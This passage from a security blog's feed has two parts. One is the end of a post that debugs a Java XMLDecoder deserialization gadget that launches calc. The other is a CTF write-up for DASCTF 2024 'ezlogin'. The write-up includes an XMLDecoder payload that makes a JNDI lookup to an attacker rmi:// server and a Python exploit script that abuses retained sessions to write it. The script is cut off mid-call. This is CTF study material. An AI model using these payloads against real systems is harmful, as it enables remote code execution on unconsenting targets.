&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以直接在ProcessBuilder#start处打个断点然后从调用栈帧开始看</p><p><img src="https://cdn.clown2024.cn/image-20241025230809734.png" alt="image-20241025230809734"></p><p>他是从readObject方法开始的，我们从那里开始跟进</p><p><img src="https://cdn.clown2024.cn/image-20241025231157408.png" alt="image-20241025231157408"></p><p>跟进到XMLDecoder#parsingComplete方法，这里会调用DocumentHandler进行xml的解析</p><p><img src="https://cdn.clown2024.cn/image-20241025231439438.png" alt="image-20241025231439438"></p><p>这个handler就是继承DefaultHandler类的，调用他的parse来对输入input进行解析，也就是以SAX方式解析</p><p><img src="https://cdn.clown2024.cn/image-20241026004719002.png" alt="image-20241026004719002"></p><p>进到方法里面，他的解析写法也和我们前面写的逻辑是一样的，都要创建一个SAXParser，然后接下来的解析就重点去关注一下他的解析函数，我们继续跟进</p><p>在DocumentHandler的构造方法中指定了可用的标签类型</p><p><img src="https://cdn.clown2024.cn/image-20241026005350433.png" alt="image-20241026005350433"></p><p>对应了com.sun.beans.decoder包中类</p><p>我们断在DocumentHandler#startElement方法</p><p><img src="https://cdn.clown2024.cn/image-20241026012931997.png" alt="image-20241026012931997"></p><p>他首先解析java标签，设置Owner和Parent,owner就是DocumentHandler类，getElementHandler方法就是从DocumentHandler构造方法时创建的map中取对应的class，如果没有则会抛出异常</p><p><img src="https://cdn.clown2024.cn/image-20241026014426012.png" alt="image-20241026014426012"></p><p>然后到解析object标签的时候，会去拿name和value也就是class和ProcessBuilder</p><p>然后就是通过addAttribute来添加属性</p><p><img src="https://cdn.clown2024.cn/image-20241026014707208.png" alt="image-20241026014707208"></p><p>这里还会调用findClass，这里是网上走到了父类NewElementHandler的这个方法</p><p>然后就是解析array标签，同样添加属性，后面就是重复的过程，自己调试看一遍即可</p><p>解析完开始标签就到闭合标签了</p><p>进入到endElement方法</p><p><img src="https://cdn.clown2024.cn/image-20241026015510343.png" alt="image-20241026015510343"></p><p>首先就是闭合的string标签</p><p><img src="https://cdn.clown2024.cn/image-20241026015649368.png" alt="image-20241026015649368"></p><p>接着闭合void和array</p><p>然后解析void标签的的method属性</p><p><img src="https://cdn.clown2024.cn/image-20241026015858555.png" alt="image-20241026015858555"></p><p>将this.method赋值为start，然后紧接着又是相关的闭合操作</p><p>中间的很多大同小异的流程就不记录了，看看文章即可</p><p>最终走到关键的地方<strong>ObjectElementHandler#getValueObject</strong>方法里</p><p><img src="https://cdn.clown2024.cn/image-20241026020414044.png" alt="image-20241026020414044"></p><p>这里是构建了一个java.beans.Expression表达式类</p><p><img src="https://cdn.clown2024.cn/image-20241026020515551.png" alt="image-20241026020515551"></p><p>然后看Expression的getValue方法</p><p><img src="https://cdn.clown2024.cn/image-20241026020824998.png" alt="image-20241026020824998"></p><p>里面会调用invoke方法，会走到其父类Statement的invoke方法</p><p><img src="https://cdn.clown2024.cn/image-20241026021017273.png" alt="image-20241026021017273"></p><p><img src="https://cdn.clown2024.cn/image-20241026021656440.png" alt="image-20241026021656440"></p><p>内部就是利用反射来进行方法调用</p><p><img src="https://cdn.clown2024.cn/image-20241026021040905.png" alt="image-20241026021040905"></p><p>最终就会返回ProcessBuilder这个类，继续往后</p><p><img src="https://cdn.clown2024.cn/image-20241026021157722.png" alt="image-20241026021157722"></p><p>到这里他就会执行start方法，内部也是反射调用start方法，后续的步骤也是差不多的就不调了</p><p>最终就是相当于最后拼接了一个表达式：<strong>new java.lang.ProcessBuilder(new String[]{“calc”}).start();</strong></p><h2 id="expression和statement"><a href="#Expression和Statement" class="headerlink" title="Expression和Statement"></a>Expression和Statement</h2><p>两者都是java反射的封装</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">&quot;你好 %s!&quot;</span>, name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.Expression;<br><span class="hljs-keyword">import</span> java.beans.Statement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        testStatement();<br>        testExpression();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testStatement</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Statement</span>(user, <span class="hljs-string">&quot;setName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;张三&quot;</span>&#125;);<br>            statement.execute();<br>            System.out.println(user.getName());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testExpression</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>            <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Expression</span>(user, <span class="hljs-string">&quot;sayHello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;小明&quot;</span>&#125;);<br>            System.out.println(expression.getValue());<span class="hljs-comment">//可以获取返回值</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">张三<br>你好 小明!<br></code></pre></td></tr></table></figure><p>他们的区别就是Expression的getValue内部执行invoke方法后能够获取返回值，而Statement是没有getValue方法是获取不了返回值的</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>XMLDecoder导致漏洞的原因就在于处理节点的时候，信任了外部输入的XML指定节点类型信息（class类型节点），同时在进行节点Expression动态实例化的时候（通过invoke实现set()方法，允许节点属性由XML任意控制</p><p>导致Expression的set()方法被重载为风险函数（本例中是start）。Expression动态解析因为Java反射特性实现了代码执行。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://y4er.com/posts/java-xmldecoder">https://y4er.com/posts/java-xmldecoder</a></p><p><a href="https://www.cnblogs.com/LittleHann/p/17814641.html">https://www.cnblogs.com/LittleHann/p/17814641.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xmldecoder介绍&quot;&gt;&lt;a href=&quot;#XMLDecoder介绍&quot; class=&quot;headerlink&quot; title=&quot;XMLDecoder介绍&quot;&gt;&lt;/a&gt;XMLDecoder介绍&lt;/h1&gt;&lt;p&gt;XMLDecoder是java自带的以SAX方式解析xml的</summary>
      
    
    
    
    <category term="true" scheme="https://clowsman.github.io/categories/true/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2024金秋十月部分题目复现</title>
    <link href="https://clowsman.github.io/2024/10/23/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2024/10/23/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-10-23T05:45:58.000Z</published>
    <updated>2024-10-26T08:12:26.534Z</updated>
    
    <content type="html"><![CDATA[<p>官方wp链接：<a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#FAsbS">https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#FAsbS</a></p><h1 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h1><p>就是一个正常的登录、注册、修改密码的服务，看了一下jar包</p><p><img src="https://cdn.clown2024.cn/image-20241023135607557.png" alt="image-20241023135607557"></p><p>见到熟悉的hutool，前面的ciscn题目复现才遇到，然后spring-boot那就是有jackson</p><p>当时审了半天的逻辑，发现能给传参的参数长度都限制死了，他有一个默认的xml文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- this is /user/AAAAAA.xml --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.auth.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>他的用户名和密码的最大长度都是以该文件里面的长度为准</p><p><img src="https://cdn.clown2024.cn/image-20241023140248515.png" alt="image-20241023140248515"></p><p>这里有个check函数限制长度，一开始没找到什么绕过的地方，遂摆😊</p><p>这里开始跟着wp复现</p><p>看EditController内容</p><p><img src="https://cdn.clown2024.cn/image-20241026104501910.png" alt="image-20241026104501910"></p><p>这里从JSESSION中获取登录的用户，然后对用户名和新密码进行检查，再进行修改密码的操作</p><p>看一下他的changePassword方法</p><p><img src="https://cdn.clown2024.cn/image-20241026105025765.png" alt="image-20241026105025765"></p><p>这里就是简单的将xml的内容读出来，然后进行新旧密码的替换，最后重新写入，注意这里没有对JSESSION的状态改变</p><p>在del用户的地方</p><p><img src="https://cdn.clown2024.cn/image-20241026105354581.png" alt="image-20241026105354581"></p><p>也是从JSESSION中获取用户然后调用delUser方法</p><p><img src="https://cdn.clown2024.cn/image-20241026105441155.png" alt="image-20241026105441155"></p><p>这里直接就把userFile给删除了，但是他并没有重置JSESSION，意思就是我们的JSESSION可以保留下来，他还是能够识别的</p><p>反序列化的点在于login路由</p><p><img src="https://cdn.clown2024.cn/image-20241026110213423.png" alt="image-20241026110213423"></p><p>看他的login方法</p><p><img src="https://cdn.clown2024.cn/image-20241026110247575.png" alt="image-20241026110247575"></p><p>里面的一个readUser方法有对xml文件进行反序列化，然后有个waf过滤了java.、springframework.、hutool.，而且还限制了文件的最大长度，就是他初始给我们的那个AAAAAA.xml的长度</p><p><img src="https://cdn.clown2024.cn/image-20241026123012865.png" alt="image-20241026123012865"></p><p>看完前面之后漏洞点就在于changePassword的时候，因为JSESSION的状态并没有改变，所以其实我们replace的时候可以保证oldPassword是一直不变的，我们就可以多次请求修改密码，一直替换oldPassword来实现任意内容的写入，比如可以xxx&#x3D;》abcxxx，abcxxx&#x3D;》abcabcxxx；</p><blockquote><p>我们替换的时候新密码需要加上旧密码，这样可以保证我们可以可控地连续写入payload</p><p>而且我们注意写入payload之后还要缩短长度满足其小于maxLength的要求</p></blockquote><p>现在绕过长度限制写任意内容的方法有了，应该怎么写，写什么呢</p><p>因为java.被禁掉了，直接写恶意代码的方法行不通，wp直接打jndi来触发Jackson的链子，springboot是自带Jackson依赖</p><p>我们要写入的payload形式是这样的</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;lookup&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://ip:port/a<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>userFile的文件长这样</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.auth.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后题目给了我们&lt;!–这样一个提示，意思让我们利用html的注释，也就是写入自己的payload将其他部分注释掉，使自己的写入的xml生效</p><p>那完整的写法思路就是利用JSESSION保留的性质，我们去重复注册删除同一个用户，然后每次注册进去都是我们想要的oldPassword对应我们要替换的xml关键字，当JSESSION搜集够了之后就可以去改该用户的xml了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.将java替换成!--来注释掉中间的内容<br>2.注册获取各个标签的JSESSION<br>3.注册一个password为特定标识符用于替换的，比如wp就用_____来作为标识<br>4.对各部分进行替换<br></code></pre></td></tr></table></figure><p>wp的payload形式如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义RMIServer地址</span><br>rmiserver = <span class="hljs-string">&quot;test&quot;</span><br><br><span class="hljs-comment"># 构造恶意Java序列化payload，用于触发漏洞</span><br>payload1 = <span class="hljs-string">&quot;--&gt;&lt;java&gt;&lt;object class=\&quot;javax.naming.InitialContext\&quot;&gt;&lt;void method=\&quot;lookup\&quot;&gt;&lt;string&gt;rmi://&quot;</span> + rmiserver + <span class="hljs-string">&quot;/a&lt;/string&gt;&lt;/void&gt;&lt;/object&gt;&lt;/java&gt;&lt;!--&quot;</span><br><br><span class="hljs-comment"># 初始化列表，用于存储分块后的payload</span><br>list1 = []<br><br><span class="hljs-comment"># 遍历payload，每5个字符进行分块，并对最后一块进行特殊处理</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(payload1), <span class="hljs-number">5</span>):<br>    <span class="hljs-comment"># 如果剩余字符大于等于5个，则正常分块并填充下划线</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload1) - i &gt;= <span class="hljs-number">5</span>:<br>        list1.append(payload1[i:i + <span class="hljs-number">5</span>:] + <span class="hljs-string">&quot;_____&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 如果剩余字符不足5个，则直接添加到列表中，并结束循环</span><br>        list1.append(payload1[i:<span class="hljs-built_in">len</span>(payload1)])<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 打印初步处理后的列表</span><br><span class="hljs-built_in">print</span>(list1)<br><br><span class="hljs-comment"># 如果列表中最后一个元素长度小于3，则进行特殊处理以构造特定的输出格式</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(list1[-<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">3</span>:<br>    <span class="hljs-comment"># 将倒数第二个元素的后三个字符与最后一个元素合并，以保持信息的连续性</span><br>    list1[-<span class="hljs-number">1</span>] = list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">8</span>:-<span class="hljs-number">5</span>:] + list1[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 修正倒数第二个元素，保留其大部分内容并去除最后一个字符，为其后续与新的最后一个元素合并做准备</span><br>    list1[-<span class="hljs-number">2</span>] = list1[-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>:]<br><br><span class="hljs-comment"># 打印最终处理后的列表</span><br><span class="hljs-built_in">print</span>(list1)<br></code></pre></td></tr></table></figure><p>exp就直接用wp的</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>targeturl = sys.argv[<span class="hljs-number">1</span>] <span class="hljs-comment">#靶机地址</span><br><br>rmiserver = sys.argv[<span class="hljs-number">2</span>] <span class="hljs-comment">#rmi服务器地址</span><br><br>sessions = &#123;&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">passwd</span>):<br>    data=&#123;<span class="hljs-string">&quot;password&quot;</span>:passwd,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>&#125;<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/register&quot;</span>,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;register <span class="hljs-subst">&#123;passwd&#125;</span> success&quot;</span>)<br>    <span class="hljs-keyword">else</span> : <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;register fail: <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getsession</span>(<span class="hljs-params">passwd</span>):<br>    data=&#123;<span class="hljs-string">&quot;password&quot;</span>:passwd,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>&#125;<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/login&quot;</span>,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-keyword">in</span> res.text.lower() :<br>        session=res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>).split(<span class="hljs-string">&quot;;&quot;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;session for <span class="hljs-subst">&#123;passwd&#125;</span> : <span class="hljs-subst">&#123;session&#125;</span>&quot;</span>)<br>        headers = &#123;<span class="hljs-string">&quot;Cookie&quot;</span> : <span class="hljs-string">f&quot;JSESSIONID=<span class="hljs-subst">&#123;session&#125;</span>&quot;</span>&#125;<br>        sessions[passwd] = headers<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;login fail : <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">editpass</span>(<span class="hljs-params">oldpass,newpass</span>):<br>    data=&#123;<span class="hljs-string">&quot;newPass&quot;</span>:newpass&#125;<br>    headers = sessions[oldpass]<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/editPass&quot;</span>,data=data,headers=headers)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;change <span class="hljs-subst">&#123;oldpass&#125;</span> to <span class="hljs-subst">&#123;newpass&#125;</span> success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;edit fail : <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">deluser</span>(<span class="hljs-params">passwd</span>):<br>    res = requests.get(targeturl+<span class="hljs-string">&quot;/del&quot;</span>,headers=sessions[passwd])<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;delete <span class="hljs-subst">&#123;passwd&#125;</span> success&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addsession</span>(<span class="hljs-params">passwd</span>):<br>    register(passwd)<br>    getsession(passwd)<br>    deluser(passwd)<br><br>payload1 = <span class="hljs-string">&quot;--&gt;&lt;java&gt;&lt;object class=\&quot;javax.naming.InitialContext\&quot;&gt;&lt;void method=\&quot;lookup\&quot;&gt;&lt;string&gt;rmi://&quot;</span>+rmiserver+<span class="hljs-string">&quot;/a&lt;/string&gt;&lt;/void&gt;&lt;/object&gt;&lt;/java&gt;&lt;!--&quot;</span><br>list1 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload1),<span class="hljs-number">5</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload1) - i &gt;= <span class="hljs-number">5</span>:<br>        list1.append(payload1[i:i+<span class="hljs-number">5</span>:]+<span class="hljs-string">&quot;_____&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        list1.append(payload1[i:<span class="hljs-built_in">len</span>(payload1)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list1)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(list1[-<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">3</span>:<br>    list1[-<span class="hljs-number">1</span>]=list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">8</span>:-<span class="hljs-number">5</span>:]+list1[-<span class="hljs-number">1</span>]<br>    list1[-<span class="hljs-number">2</span>]=list1[-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]+list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(list1)<br><br><br>list2=[]<br>payload2=<span class="hljs-string">&quot;11111 class=\&quot;org.example.auth.User\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload2),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload2) - i &gt;= <span class="hljs-number">10</span>:<br>        list2.append(payload2[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list2.append(payload2[i:<span class="hljs-built_in">len</span>(payload2)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list2)<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list2:<br>    addsession(s)<br><br>list3=[]<br>payload3=<span class="hljs-string">&quot;void property=\&quot;username\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload3),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload3) - i &gt;= <span class="hljs-number">10</span>:<br>        list3.append(payload3[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list3.append(payload3[i:<span class="hljs-built_in">len</span>(payload3)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list3)<br><br><br>list4=[]<br>payload4=<span class="hljs-string">&quot;void property=\&quot;password\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload4),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload4) - i &gt;= <span class="hljs-number">10</span>:<br>        list4.append(payload4[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list4.append(payload4[i:<span class="hljs-built_in">len</span>(payload4)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list4)<br><br><br><br>addsession(<span class="hljs-string">&quot;_____&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;____&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list3:<br>    addsession(s)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list4:<br>    addsession(s)<br><br>addsession(<span class="hljs-string">&quot;string&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;object&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;/void&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;    &quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;1111111111&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;/11111&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;java&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;11111&quot;</span>)<br><br>register(<span class="hljs-string">&quot;haha&quot;</span>)<br>getsession(<span class="hljs-string">&quot;haha&quot;</span>)<br>editpass(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;!--&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;/11111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;    